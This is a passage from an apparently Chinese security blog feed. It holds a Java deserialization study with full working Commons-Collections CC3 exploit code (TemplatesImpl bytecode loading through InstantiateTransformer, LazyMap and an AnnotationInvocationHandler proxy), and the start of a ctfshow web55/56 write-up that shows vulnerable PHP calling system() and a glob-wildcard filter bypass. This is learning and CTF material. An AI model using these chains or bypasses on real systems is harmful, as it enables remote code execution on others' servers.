tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/class/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodes.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstruction.newInstance(Override.class,lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Override.class, mapProxy);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030164952-cznqat9.png" alt="image"></p><p>我们利用这个 TemplatesImpl加载恶意类 是通过<code>TemplatesImpl.newTransformer()</code>​</p><p>我们还可以再往上找找，看有没有什么地方调用了 newTransformer()</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030155832-5b2expm.png" alt="image"></p><p>首先Process是在main里面写的，是作为一般对象用的，所以不用它</p><p>然后<code>getOutputProperties</code>​，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用</p><p>TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参</p><p>至于TrAXFilter，虽然它也是不能序列化的，但是它的构造函数可以传</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030161432-ihyaxfk.png" alt="image"></p><p>所以CC3的作者找到了<code>InstantiateTransformer</code>​这个类</p><p>关键代码如下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030161757-rz8bsxk.png" alt="image"></p><p>意思就是判断传进来这个参数是不是Class类型的，如果是，就获取指定参数类型的构造器，调它的构造函数</p><p>看一下它的参数</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030162035-5yk76yd.png" alt="image"></p><p>那么就可以修改写出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/class/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodes.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><span class="hljs-comment">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(templates),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="hljs-comment">//        &#125;;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030163458-fu6psry.png" alt="image"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/class/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodes.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstruction.newInstance(Override.class,lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Override.class, mapProxy);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030164213-zfjhihq.png" alt="image"></p><p>这里有一个点要注意一下，就是不能直接将<code>LazyMap.decorate</code>​里直接换成<code>instantiateTransformer</code>​</p><p>还是CC1遇见的不可控的问题，所以要用<code>chainedTransformer</code>​包裹起来</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字rce（ctfshow web55）</title>
    <link href="/post/web55-no-letters-pure-numbers-rce-2npubc.html"/>
    <url>/post/web55-no-letters-pure-numbers-rce-2npubc.html</url>
    
    <content type="html"><![CDATA[<h1 id="web55-56（无字母数字rce）"><a href="#web55-56（无字母数字rce）" class="headerlink" title="web55-56（无字母数字rce）"></a>web55-56（无字母数字rce）</h1><h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>参考P神的文章 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p><p>一言以蔽之：</p><p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>​，文件名最后6个字符是随机的大小写字母，利用<code>.</code>​来执行</p><p>执行<code>. /tmp/phpXXXXXX</code>​，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li>​<code>*</code>​可以代替0个及以上任意字符</li><li>​<code>?</code>​可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>​就可以表示为<code>/*/?????????</code>​或<code>/???/?????????</code>​</p><p>但是符合<code>/???/?????????</code>​条件的文件有很多，最后发现所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>​与<code>[</code>​之间：</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250905161334-kx3a8m4.png" alt="image"></p><p>那么，我们可以利用<code>[@-[]</code>​来表示大写字母</p><p>当然，php生成临时文件名是<strong>随机</strong>的，最后一个字符<strong>不一定是大写字母</strong>，不过<strong>多尝试几次</strong>也就行了。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><br/><p>首先构造post上传文件的数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 